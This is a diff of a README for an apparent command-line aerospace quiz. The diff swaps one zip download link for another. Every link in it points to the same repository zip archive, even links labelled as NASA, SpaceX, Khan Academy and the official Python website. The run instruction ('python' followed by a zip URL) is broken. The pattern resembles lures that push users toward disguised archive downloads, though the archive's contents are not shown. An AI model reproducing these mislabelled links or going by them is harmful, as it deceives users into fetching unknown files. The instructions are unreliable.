@@ -13,7 +13,7 @@ Before you begin, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download Aerospace-Knowledge-Quiz-CLI](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip)
+[Download Aerospace-Knowledge-Quiz-CLI](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip)
 
 Once you're on the Releases page, find the latest version and download the file suitable for your operating system.
 
@@ -34,9 +34,9 @@ After downloading the file, follow these steps to run the quiz:
 3. **Run the Application**:
    Type the following command to run the application:
    ```
-   python https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip
+   python https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip
    ```
-   Replace `https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip` with the actual file name if it's different.
+   Replace `https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip` with the actual file name if it's different.
 
 4. **Start the Quiz**:
    Follow the on-screen prompts to begin the quiz. Answer the multiple-choice questions to test your knowledge about rocketry and aerospace.
@@ -56,7 +56,7 @@ This quiz covers essential themes in aerospace. You will learn about:
 ## ⚙️ Troubleshooting
 If you encounter any issues while running the application, consider the following:
 
-- **Python Not Installed**: Ensure Python is installed on your system. You can download it from the [official Python website](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip).
+- **Python Not Installed**: Ensure Python is installed on your system. You can download it from the [official Python website](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip).
 - **Permission Issues**: If you receive permission errors, try running your terminal as an administrator.
 - **File Not Found**: Double-check that you are in the correct directory where the quiz file is located.
 
@@ -69,13 +69,13 @@ This project is licensed under the MIT License. You can freely use and modify th
 ## 🔗 Additional Resources
 For more information about aerospace and rocket science, consider visiting these resources:
 
-- [NASA](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip)
-- [SpaceX](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip)
-- [Khan Academy - Rocket Science](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip)
+- [NASA](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip)
+- [SpaceX](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip)
+- [Khan Academy - Rocket Science](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip)
 
 ## 📲 Quick Reminder
 To download the latest version of the quiz, click the link below:
 
-[Download Aerospace-Knowledge-Quiz-CLI](https://raw.githubusercontent.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/main/src/Aerospace-Knowledge-Quiz-CLI-v3.2.zip)
+[Download Aerospace-Knowledge-Quiz-CLI](https://github.com/carloscapo19/Aerospace-Knowledge-Quiz-CLI/raw/refs/heads/main/tests/Knowledge-CLI-Quiz-Aerospace-1.9.zip)
 
 Enjoy testing your aerospace knowledge!
